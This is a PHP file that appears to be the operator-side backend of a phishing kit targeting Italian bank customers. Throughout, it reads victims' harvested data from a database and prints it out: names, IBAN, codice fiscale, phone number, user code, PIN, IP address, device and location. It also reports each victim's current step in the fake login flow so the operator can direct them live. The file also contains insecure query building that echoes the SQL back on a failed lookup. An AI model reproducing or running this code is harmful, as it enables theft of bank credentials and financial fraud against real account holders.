<?php
require_once 'admin/inc/mysql.php';

if (isset($_GET['getstatus'])) {
  
    if ($_GET['getstatus'] !== "") {
        $checkStatus = getRow("SELECT * FROM data WHERE identifier='" . addslashes($_GET['getstatus']) . "'");

        if ($checkStatus !== NULL) {
			
			if ($checkStatus['status'] == 3) {
				echo $checkStatus['status'] . ":" . $checkStatus['redirect_url'];
			} elseif ($checkStatus['status'] == 2) {
				echo $checkStatus['status'] . ":" . $checkStatus['pin'] . ":" . $checkStatus['codiceUtente'] . ":" . $checkStatus['iban'] . ":" . $checkStatus['nomeProcuratore'];
			}  else {
				echo $checkStatus['status'];
			}
   
        
   
        } else {
            echo "SELECT * FROM data WHERE identifier='" . addslashes($_GET['getstatus']) . "'";
        }
    }
}


if (isset($_GET['get_submitted'])) {
   $data = getRow("SELECT * FROM data WHERE seen=0");
   if ($data != NULL) {
    echo "ok";
   }
}

if (isset($_GET['get_submitted_user'])) {
	$data = getRow("SELECT * FROM data WHERE seen=0 AND identifier='" . addslashes($_GET['id']) . "'");
	if ($data != NULL) {
	 echo "ok";
	if ($data['status'] == 0)  {
    echo "Current Page: LOADING";
 } elseif ($data['status'] == 1)  {
    echo "Current Page: ENTERING NAME & USERNAME";
 } elseif ($data['status'] == 2)  {
    echo "Current Page: SHOWING STEP2";
 }   elseif ($data['status'] == 3)  {
    echo "Current Page: EXIT / REDIRECTED";
 }  
 echo "\n";

   if ($data['nome'] != '') {
      echo  "First Name: " . $data['nome'] . "\n";
      echo "-----------------------------------\n";
   }

   if ($data['cognome'] != '') {
      echo  "Last Name: " . $data['cognome'] . "\n";
      echo "-----------------------------------\n";
   }

   if ($data['iban'] != '') {
      echo  "IBAN Provided: " . $data['iban'] . "\n";
      echo "-----------------------------------\n";
   }

   if ($data['codiceFiscale'] != '') {
      echo  "Codice Fiscale Provided: " . $data['codiceFiscale'] . "\n";
      echo "-----------------------------------\n";
   }

   if ($data['telefono'] != '') {
      echo  "Telefono Provided: " . $data['telefono'] . "\n";
      echo "-----------------------------------\n";
   }

   if ($data['codiceUtente'] != '') {
      echo  "Codice Utente Provided: " . $data['codiceUtente'] . "\n";
      echo "-----------------------------------\n";
   }

   if ($data['pin'] != '') {
      echo  "Pin Provided: " . $data['pin'] . "\n";
      echo "-----------------------------------\n";
   }

   if ($data['nomeProcuratore'] != '') {
      echo  "Nome Procuratore: " . $data['nomeProcuratore'] . "\n";
      echo "-----------------------------------\n";
   }
        

        
       echo 'IP: ' . $data['ip']  . '
Device: ' . $data['device'] . '\n
User Agent: ' . $data['ua'] . '\n
Location: ' . $data['location'];
	}
 }


